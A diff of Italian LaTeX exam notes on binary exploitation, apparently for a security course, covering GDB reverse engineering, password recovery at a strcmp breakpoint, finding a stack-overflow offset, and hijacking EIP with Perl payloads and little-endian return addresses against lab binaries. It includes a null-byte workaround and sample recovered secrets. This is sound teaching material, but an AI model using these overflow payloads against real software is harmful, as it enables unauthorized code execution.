@@ -1145,35 +1145,52 @@
 	\end{lstlisting}
 	Questo comando stampa a schermo tutti i caratteri testuali leggibili. Spesso rivela password banali in chiaro o messaggi di successo/errore che aiutano a intuire la logica del programma senza dover leggere direttamente il codice macchina.
 	
-	\subsection{Analisi Dinamica e Mappatura (GDB)}
-	Una volta aperto il binario in GDB (\texttt{gdb ./nome\_binario}), i primi passi per orientarsi "al buio" sono:
-	\begin{itemize}
-		\item \textbf{\texttt{info functions}}: Trova tutte le funzioni caricate. Cerca nomi sospetti (es. \texttt{reveal}, \texttt{give\_shell}, \texttt{print\_flag}, \texttt{check}) e appuntati subito i loro indirizzi esadecimali.
-		\item \textbf{\texttt{disas main}}: Leggi l'assembly della funzione principale per vedere il flusso di base e capire quali altre funzioni di controllo vengono richiamate.
-	\end{itemize}
+	\subsection{Analisi Dinamica: Il Metodo "Top-Down" (Workflow del Professore)}
+	L'approccio professionale per analizzare un binario al buio non è lanciare comandi a caso o listare subito tutte le funzioni, ma seguire il flusso logico di esecuzione per scoprire l'albero delle chiamate.
+	
+	\begin{enumerate}
+		\item \textbf{Test di Base:} Prima di aprire GDB, lancia il programma normalmente (es. \texttt{./secret ciao}) e successivamente con un input enorme (es. \texttt{perl -e 'print "A"x10000'}) per confermare l'effettiva vulnerabilità e ottenere il \textit{Segmentation fault}.
+		\item \textbf{Disas del Main:} Apri GDB e parti sempre dalla radice: \texttt{disas main}. Ispeziona l'assembly per capire il flusso di base e individuare le chiamate alle sotto-funzioni scritte dall'autore (es. \texttt{call 0x... <check>}), ignorando per il momento chiamate di libreria note come \texttt{printf} o \texttt{strcpy}.
+		\item \textbf{Esplorazione a Cascata:} Spostati nella funzione custom appena trovata eseguendo il suo disassemblaggio (es. \texttt{disas check}). È all'interno di questi branch secondari che solitamente si dirama la logica condizionale. Cerca istruzioni di salto (\texttt{jne}, \texttt{cmp}) seguite da ulteriori \texttt{call} a funzioni dai nomi sospetti (es. \texttt{trythat}, \texttt{maybethisone}).
+		\item \textbf{Estrazione Indirizzi:} Solo a questo punto, sapendo esattamente \textit{quali} sono le funzioni che governano il programma, utilizza il comando \texttt{info functions}. L'output rivelerà la mappatura completa in memoria, permettendoti di annotare chirurgicamente gli indirizzi esadecimali delle funzioni candidate individuate al passo 3 (oppure gli indirizzi esadecimali delle rispettive istruzioni \texttt{call} per bypassare il problema dei Bad Characters).
+	\end{enumerate}
 	
 	\subsection{Il trucco del Breakpoint su strcmp (Recupero Password Offuscate)}
-	Se la password non è in chiaro ma viene mascherata tramite XOR o calcolata a runtime, \texttt{strings} fallirà. Tuttavia, al momento del controllo finale, la tua password errata e quella segreta \textbf{devono essere confrontate in chiaro} in memoria.
+	Se la password non è in chiaro ma viene mascherata, \texttt{strings} fallirà (anche se è sempre bene lanciarlo per cercare indizi o messaggi di errore). Tuttavia, al momento del controllo finale, la tua password errata e quella segreta \textbf{devono essere confrontate in chiaro} in memoria dalla funzione di libreria.
+	
+	Ecco il workflow operativo definitivo basato sulla soluzione d'esame:
 	\begin{enumerate}
-		\item Usa \texttt{disas nome\_funzione} (es. \texttt{disas check}) per visualizzare il codice assembly della funzione di validazione.
-		\item Cerca la riga dove viene chiamata la funzione di comparazione delle stringhe: \texttt{call <strcmp@plt>}.
-		\item Metti un breakpoint un attimo prima di quella chiamata usando il suo indirizzo esadecimale: \texttt{b *0x0804xxxx}.
-		\item Lancia il programma con \texttt{run} e inserisci una password fittizia.
-		\item Quando l'esecuzione si ferma al breakpoint, ispeziona la memoria per svelare la password. I valori da confrontare si trovano nei registri o in cima allo stack. Usa \texttt{x/1s \$eax} (oppure guarda la cima dello stack con \texttt{x/2xw \$esp} per vedere i puntatori e poi \texttt{x/1s [indirizzo\_trovato]}) per stampare la password segreta in chiaro a schermo!
+		\item Usa \texttt{disas main} per capire il flusso. Se vedi che invoca una funzione di validazione (es. \texttt{call <check>}), procedi esplorando quella con \texttt{disas check}.
+		\item Cerca la riga dove viene chiamata la funzione di comparazione: \texttt{call <strcmp@plt>}. Appuntati l'indirizzo esadecimale di \textbf{quella precisa istruzione} (es. \texttt{0x080491d9}).
+		\item Metti un breakpoint esattamente lì: \texttt{b *0x080491d9}.
+		\item Lancia il programma inserendo una password fittizia: \texttt{run ciao}.
+		\item Quando l'esecuzione si ferma al breakpoint, i valori da confrontare sono già stati caricati nei registri o sullo stack. Ispeziona il registro puntato (solitamente \texttt{EAX}) chiedendo a GDB di stamparlo come stringa (\texttt{s}):
+		\begin{lstlisting}[language=bash]
+			(gdb) x/s $eax
+			0x804a008: "ThisShouldBeHardToGuess"
+		\end{lstlisting}
+		Hai appena svelato la password segreta in chiaro!
 	\end{enumerate}
 	
 	\section{Metodologia di Exploitation}
-	Per prendere il controllo del registro EIP, è necessario determinare l'esatto \textit{offset}, ovvero il numero preciso di byte di padding richiesti per sovrascrivere l'EBP salvato prima di raggiungere l'indirizzo di ritorno. \\\\
-	In sede d'esame, in mancanza di script esterni, questo calcolo si effettua empiricamente sfruttando il metodo della \textbf{bisezione}:
+	Per prendere il controllo del registro EIP, è necessario determinare l'esatto \textit{offset}, ovvero il numero preciso di byte di padding richiesti per arrivare all'indirizzo di ritorno.
+	
+	In sede d'esame questo calcolo si effettua empiricamente con la \textbf{ricerca dicotomica (bisezione)}:
 	\begin{enumerate}
-		\item Si inviano inizialmente input di lunghezza progressivamente crescente (es. grandi blocchi di caratteri "A") fino a forzare il programma al crash per errore di segmentazione (\textit{Segmentation Fault}).
-		\item Si analizza lo stato dei registri in GDB al momento del blocco. Se l'EIP mostra il valore \texttt{0x41414141} (corrispondente ad "AAAA"), significa che il buffer è stato completamente saturato ed è stato superato l'indirizzo di ritorno.
-		\item Si riduce l'intervallo affinando la stringa e sostituendo gli ultimi 4 byte critici del blocco stimato con caratteri differenti (es. "BBBB"). Nel momento in quali GDB mostrerà il crash esatto sull'indirizzo \texttt{0x42424242} (corrispondente alle "B"), sapremo di aver isolato al singolo byte la misura esatta del padding necessario per controllare l'EIP.
+		\item Si inviano grandi blocchi di caratteri "A" (es. \texttt{print "A"x10000}) per verificare se il binario è vulnerabile al \textit{Segmentation Fault}.
+		\item Se vulnerabile, si affina il numero e si aggiungono 4 byte finali riconoscibili (es. "BBBB") concatenandoli con la virgola in Perl:
+		\begin{lstlisting}[language=bash]
+			(gdb) run $(perl -e 'print "A"x212, "BBBB"')
+		\end{lstlisting}
+		\item Si analizza il crash. Se GDB mostra esattamente \texttt{0x42424242 in ?? ()}, significa che le 4 "B" hanno sovrascritto l'EIP chirurgicamente. 
+		\begin{nota}[Il Padding Esatto]
+			Se \texttt{"A"x212, "BBBB"} ti restituisce \texttt{0x42424242}, il tuo offset finale di iniezione è \textbf{212}.
+		\end{nota}
 	\end{enumerate}
 	
 	\section{Scenari d'Esame}
 	
-	\subsection{Scenario 1: Sovrascrivere una variabile di controllo (write\_var)}
+	\subsection{Scenario 1: Sovrascrivere una variabile di controllo}
 	\textbf{Contesto e Obiettivo:} Il programma non deve aprire una shell, ma semplicemente stampare una flag nascosta. Per farlo, richiede che una variabile locale (dichiarata nel codice subito dopo il buffer) assuma un valore esatto per superare un controllo \texttt{if}. Noi sborderemo dal buffer per sovrascrivere proprio quella variabile.
 	
 	\begin{enumerate}
@@ -1196,21 +1213,33 @@
 		\end{lstlisting}
 	\end{enumerate}
 	
-	\subsection{Scenario 2: Esecuzione di funzioni nascoste (secret\_function)}
-	\textbf{Contesto e Obiettivo:} Il programma alloca una \texttt{struct} in memoria che contiene prima un buffer e poi un \textit{function pointer} (un puntatore che indica alla CPU quale funzione eseguire). Questo puntatore richiama normalmente una funzione lecita. Il nostro obiettivo è "sbrodolare" dal buffer per sovrascrivere il puntatore, sostituendolo con l'indirizzo di una funzione "segreta" presente nel codice ma mai richiamata.
+	\subsection{Scenario 2: Esecuzione di funzioni nascoste multiple}
+	\textbf{Contesto e Obiettivo:} Il programma vulnerabile contiene diverse funzioni di testing o derisione (es. "Ugh.", "Nope") e una sola funzione risolutiva che stampa la flag. L'obiettivo è sovrascrivere l'EIP per eseguire la funzione corretta.
 	
 	\begin{enumerate}
-		\item \textbf{Fase 1: Trovare l'indirizzo della funzione segreta}
-		È sufficiente aprire GDB e chiedere la lista di tutte le funzioni caricate in memoria e i relativi indirizzi. 
-		\begin{lstlisting}[language=bash]
-			(gdb) info functions              # Cerca nell'elenco la funzione segreta
-		\end{lstlisting}
-		\textit{Nota:} GDB mostrerà direttamente l'indirizzo (es. \texttt{0x565561b9}). Il comando \texttt{p nome\_funzione} si usa solo in alternativa se la lista è troppo lunga e si vuole filtrare.
+		\item \textbf{Fase 1: Trovare le funzioni candidate}
+		Esegui \texttt{info functions} per mappare lo spazio di indirizzamento, oppure fai il \texttt{disas} delle funzioni principali per vedere quali sub-routine vengono invocate. Appuntati le funzioni sospette (es. \texttt{trythis}, \texttt{trythat}, \texttt{maybethisone}).
 		
-		\item \textbf{Fase 2: Calcolo Offset e Iniezione}
-		Trovato l'offset del buffer tramite la solita bisezione (tentativi con lunghezze crescenti), si inverte l'indirizzo trovato al passo 1 in formato Little-Endian e lo si accoda al padding:
+		\item \textbf{Fase 2: Il Trucco della \texttt{CALL} (Bypass Bad Characters)}
+		Se prendi l'indirizzo diretto di una funzione da \texttt{info functions} (es. \texttt{0x08049300}) potresti accorgerti che contiene un Null Byte (\texttt{\textbackslash x00}). Se provi a iniettarlo, la stringa verrà troncata e l'exploit fallirà!
+		\begin{nota}[Pro-Tip d'Esame: Saltare alla Call]
+			Invece di saltare all'inizio della funzione desiderata, fai il \texttt{disas} della funzione che la invoca (es. \texttt{disas check}). Cerca l'istruzione \texttt{call}:
+			\begin{lstlisting}[language=bash]
+				0x080491fe <+88>: call 0x8049300 <maybethisone>
+			\end{lstlisting}
+			Usa l'indirizzo dell'istruzione \texttt{call} (in questo caso \texttt{0x080491fe}). Non contiene byte nulli! Saltando lì, la CPU eseguirà comunque la chiamata alla funzione corretta aggirando i filtri di bash o C.
+		\end{nota}
+		
+		\item \textbf{Fase 3: Test Iterativo delle Funzioni}
+		Costruisci il payload invertendo l'indirizzo scelto in formato Little-Endian (\texttt{\textbackslash xfe\textbackslash x91\textbackslash x04\textbackslash x08}) e provalo.
 		\begin{lstlisting}[language=bash]
-			./vulnerable_binary $(perl -e 'print "A"x[OFFSET] . "\xb9\x61\x55\x56"')
+			# Test funzione 1 ("maybethisone")
+			(gdb) run $(perl -e 'print "A"x212, "\xfe\x91\x04\x08"')
+			# Output: Ugh. -> Sbagliata.
+			
+			# Test funzione 2 ("trythat") usando l'indirizzo della sua CALL (es. 0x080491ed)
+			(gdb) run $(perl -e 'print "A"x212, "\xed\x91\x04\x08"')
+			# Output: SEC{C0ngr4tsUfoundIT} -> Corretta!
 		\end{lstlisting}
 	\end{enumerate}
 	
